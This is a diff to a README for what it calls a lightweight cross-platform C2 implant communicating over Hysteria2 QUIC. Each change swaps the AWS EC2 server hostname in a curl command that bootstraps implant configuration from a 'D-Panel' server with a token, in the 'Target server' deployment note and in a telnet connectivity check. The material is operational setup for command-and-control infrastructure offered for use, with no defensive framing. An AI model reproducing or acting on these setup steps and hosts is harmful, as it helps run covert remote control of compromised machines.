@@ -16,7 +16,7 @@ A lightweight, cross-platform C2 implant that communicates over Hysteria2 QUIC p
 ### 1. Generate Implant Configuration
 ```bash
 # Bootstrap from D-Panel server
-curl "https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=dpanel-implant-bootstrap-token-change-this&implant=true"
+curl "https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=dpanel-implant-bootstrap-token-change-this&implant=true"
 ```
 
 ### 2. Run Implant
@@ -86,7 +86,7 @@ GOOS=linux GOARCH=amd64 go build -o h2-implant .
 
 ## Deployment Notes
 
-- Target server: **ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com**
+- Target server: **ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com**
 - Default port: **443** (HTTPS)
 - Backup port: **8080**
 - Protocol: **Hysteria2 over QUIC**
@@ -101,7 +101,7 @@ GOOS=linux GOARCH=amd64 go build -o h2-implant .
 ## Troubleshooting
 
 ### Connection Issues
-- Verify server connectivity: `telnet ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com 443`
+- Verify server connectivity: `telnet ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com 443`
 - Check DNS resolution for Cloudflare SNI
 - Validate firewall allows UDP outbound
 
